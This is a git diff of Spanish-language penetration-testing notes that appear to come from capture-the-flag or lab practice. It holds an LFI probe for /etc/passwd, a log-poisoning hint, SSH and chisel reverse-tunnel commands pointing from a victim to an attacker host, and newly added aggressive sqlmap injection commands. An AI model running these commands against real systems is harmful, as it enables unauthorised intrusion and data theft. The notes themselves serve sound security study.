@@ -31,6 +31,7 @@ En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD ru
 Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 Si se junta LFI y PHP mira a ver si puedes hacer log poison
 find / 2>/dev/null | grep \.txt$  ---> \. -> termina en txt,,  $ -> fin de linea, no hay nada detras del txt
+FOOTHOLD --> todo lo que haces hasta llegar a una shell
 ```
 ### SUDOERS
 ```
@@ -76,7 +77,7 @@ python -m SimpleHTTPServer  80
 
 ```
 ```
-### TUNNEL SSH
+### TUNNEL SSH/PORTFORWARDING
 
 El tunel sirve para cuando te encuentras un puerto abierto que este en localhost (solo se puede acceder desde la propia maquina victima, solo esta abierto para dentro) que necesite de interfaz grafica como vncviewer
 ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84
@@ -89,6 +90,13 @@ ssh -L puertoquequeremosaccederdesdemimaquina:127.0.0.1:puertodelservicio usuari
 ./chisel server -p 9999 --reverse ---> nuestra maquina, primero este comando
 ./chisel client 10.10.14.4:9999 R:3000:172.17.0.1:3000 ---> maquina victima
 ./chisel client 10.10.14.4:9999 R:127.0.0.1:7777:172.17.0.1:3000 ---> localhost:7777
+```
+### SQLMAP
+```
+python3 sqlmap.py --batch --risk 3 --level 5 --technique=BEUSQ --privilege -r ./reqs/tri.req ---> busca posibles inyecciones sql
+
+sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 --> doble inyeccion sql
+
 ```
 ### SSTI
 
